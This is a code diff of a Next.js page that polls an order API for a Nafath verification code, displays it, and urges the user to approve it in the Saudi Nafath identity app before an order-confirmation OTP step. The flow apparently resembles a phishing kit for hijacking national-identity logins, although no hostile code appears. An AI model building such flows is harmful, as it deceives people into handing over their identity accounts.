@@ -1,110 +1,182 @@
-import { FaArrowRightLong } from 'react-icons/fa6'
-import { useRouter, useSearchParams } from 'next/navigation'
-
-import Link from 'next/link'
-import { useCallback, useEffect, useState } from 'react'
-import SwiperSlider from '@/components/SwiperSlider'
+import { FaArrowRightLong } from "react-icons/fa6";
+import { useRouter, useSearchParams } from "next/navigation";
+import { Button, CardBody, CircularProgress } from "@nextui-org/react";
+import Link from "next/link";
+import { useCallback, useEffect, useState } from "react";
+import SwiperSlider from "@/components/SwiperSlider";
+import { BsFillInfoCircleFill } from "react-icons/bs";
+import { motion } from "framer-motion";
 
 const NafatOtpTwo = () => {
-  const router = useRouter()
-  const params = useSearchParams()
-  const _id = params.get('id')
+  const router = useRouter();
+  const params = useSearchParams();
+  const _id = params.get("id");
 
   // get order data from api localhost:3000/api/order/:id
-  const [order, setOrder] = useState([])
+  const [order, setOrder] = useState([]);
 
   const handleSubmit = (e) => {
-    e.preventDefault()
+    e.preventDefault();
     router.push({
-      pathname: '/order-confirmation-otp',
-      query: { id: params.get('id') },
-    })
-  }
+      pathname: "/order-confirmation-otp",
+      query: { id: params.get("id") },
+    });
+  };
 
   // a countdown timer function
-  const [time, setTime] = useState(180)
-
-  const url = `${process.env.API_URL}/api/order/${_id}`
-
-  const fetchOrder = useCallback(async () => {
-    const response = await fetch(url)
-    const data = await response.json()
-    setOrder(data)
-  }, [url])
+  const [value, setValue] = useState(0);
 
   useEffect(() => {
-    fetchOrder()
-    const timer = setInterval(() => {
-      setTime((prevTime) => {
-        if (prevTime === 0) {
-          clearInterval(timer)
-          return 0
+    const interval = setInterval(() => {
+      setValue((v) => {
+        if (order.nafatOtpTwo) {
+          clearInterval(interval);
+          return 100; // Set to 100% when order.nafatOtpTwo is true
         }
-        return prevTime - 1
-      })
-    }, 1000)
+        if (v >= 100) {
+          clearInterval(interval);
+          return 100; // Stop at 100%
+        }
+        return v + 1;
+      });
+    }, 1200); // 1200 milliseconds = 1.2 seconds
 
-    return () => clearInterval(timer)
-  }, [fetchOrder])
+    return () => clearInterval(interval);
+  }, [order.nafatOtpTwo]);
+
+  const url = `${process.env.API_URL}/api/order/${_id}`;
+  const fetchOrder = useCallback(async () => {
+    if (!_id || order.nafatOtpTwo) return; // Early return if _id is not available or nafatOtpTwo is already set
+
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error("Failed to fetch order data");
+      }
+      const data = await response.json();
+      setOrder(data);
+    } catch (error) {
+      console.error("Error fetching order:", error);
+    }
+  }, [url, _id, order.nafatOtpTwo]);
+
+  useEffect(() => {
+    if (order.nafatOtpTwo) return; // Stop polling if nafatOtpTwo is already set
+    const intervalId = setInterval(() => {
+      fetchOrder();
+    }, 2000); // Poll every 5 seconds
+
+    return () => clearInterval(intervalId);
+  }, [fetchOrder, order.nafatOtpTwo]);
 
   const reload = () => {
-    window.location.reload()
-  }
+    window.location.reload();
+  };
 
   return (
     <>
       <SwiperSlider />
-      <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
-        <h1 className="text-4xl font-bold text-gray-600 mt-10">
-          Nafath App OTP2
+      <div className="max-w-[1400px] w-[92%] lg:w-3/4 mx-auto flex flex-col justify-center items-center gap-6">
+        <h1 className="text-4xl font-bold text-gray-600 mt-10 text-center">
+          Verify Yourself with Nafat
         </h1>
-        {/* a countdown timer for 180s design */}
-        <div className="flex justify-center items-center gap-2 mt-5 border-4 h-28 w-28 rounded-full">
-          <h1 className="text-2xl font-bold text-gray-600 m-0">
-            {Math.floor(time / 60)}:
-          </h1>
-          <h1 className="text-2xl font-bold text-gray-600 m-0">{time % 60}</h1>
+
+        <div className="border-2 border-blue-300 p-4 flex flex-col lg:flex-row items-center gap-3">
+          <BsFillInfoCircleFill color="blue" className="w-max" />
+          <div className="text-center text-sm">
+            <p>
+              If you do not have the Nafath application installed on your
+              device,
+            </p>
+            <p>first download it and register.</p>
+          </div>
         </div>
-        <p className="text-gray-600 text-center mt-5 font-bold">
-          رجى قبول طلب تسجيل الدخول من تطبيق نفاذ
+
+        <p className="text-center font-semibold text-gray-600">
+          To verify your information, Log in the <br /> Nafath app and select
+          this code
         </p>
-        <p className="text-gray-600 text-center my-5 font-bold">
-          Please accept the login request from Nafath app
-        </p>
+
+        <CircularProgress
+          classNames={{
+            svg: "w-36 h-36 drop-shadow-md",
+            indicator: "stroke-[#0D9488]",
+            track: "#0D9488",
+            value: "text-3xl font-semibold text-gray-700",
+          }}
+          value={value}
+          strokeWidth={4}
+          showValueLabel={true}
+        />
+
         {/* a countdown design round border */}
-        <div className="flex justify-center items-center gap-2 rounded-full border-2 h-16 w-16">
-          <p className="text-gray-600 text-center m-0 font-bold">
-            {order.nafatOtpTwo ? order.nafatOtpTwo : 'N/A'}
-          </p>
+        <div className="h-14 w-14">
+          {order.nafatOtpTwo ? (
+            <motion.div
+              initial={{ scale: 0.9 }}
+              animate={{ rotate: 360, scale: 1 }}
+              transition={{
+                type: "spring",
+                stiffness: 260,
+                damping: 20,
+                repeat: Infinity,
+                repeatType: "mirror",
+                duration: 1.3,
+                rotate: {
+                  duration: 1, // Rotation happens over 1 second
+                },
+              }}
+              className="bg-[#0D9488] text-white w-full h-full rounded-lg flex justify-center items-center"
+            >
+              <p>{order.nafatOtpTwo}</p>
+            </motion.div>
+          ) : (
+            <motion.div
+              initial={{ scale: 0.9 }}
+              animate={{ rotate: 360, scale: 1 }}
+              transition={{
+                type: "spring",
+                stiffness: 260,
+                damping: 20,
+                repeat: Infinity,
+                repeatType: "mirror",
+                duration: 1.3,
+                rotate: {
+                  duration: 1, // Rotation happens over 1 second
+                },
+              }}
+              className="bg-gray-400 text-white w-full h-full rounded-lg flex justify-center items-center"
+            >
+              <p>N/A</p>
+            </motion.div>
+          )}
+          {/* </p> */}
         </div>
         <Link
           href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
           target="_blank"
-          className="py-3 mt-4 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out"
+          className="py-3 mt-4 px-5 w-fit text-gray-600 hover:text-white hover:bg-[#0D9488] font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out"
         >
           OPEN NAFATH APP
         </Link>
-        {order.nafatOtpTwo ? (
-          <form onSubmit={handleSubmit} className="w-3/4 my-14">
-            <button
-              type="submit"
-              className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
-            >
-              Continue To order-confirmation-otp <FaArrowRightLong size={16} />
-            </button>
-          </form>
-        ) : (
-          <button
-            onClick={reload}
-            className="flex gap-2 justify-center items-center rounded-sm font-bold my-14 w-3/4 px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-gray-500 hover:bg-gray-600 focus:outline-none focus:bg-gray-600"
+        <form onSubmit={handleSubmit} className="my-10 w-full">
+          <Button
+            color="primary"
+            onClick={!order.nafatOtpTwo ? reload : ""}
+            type={!order.nafatOtpTwo ? "button" : "submit"}
+            className={`w-full text-white h-12 ${
+              !order.nafatOtpTwo
+                ? "cursor-not-allowed bg-gray-400 "
+                : "bg-[#0D9488]"
+            }`}
           >
-            Reload Page
-          </button>
-        )}
+            Continue To Order Confirmation OTP <FaArrowRightLong size={16} />
+          </Button>
+        </form>
       </div>
       <div className="h-20 bg-teal-400 mt-5"></div>
     </>
-  )
-}
+  );
+};
 
-export default NafatOtpTwo
+export default NafatOtpTwo;
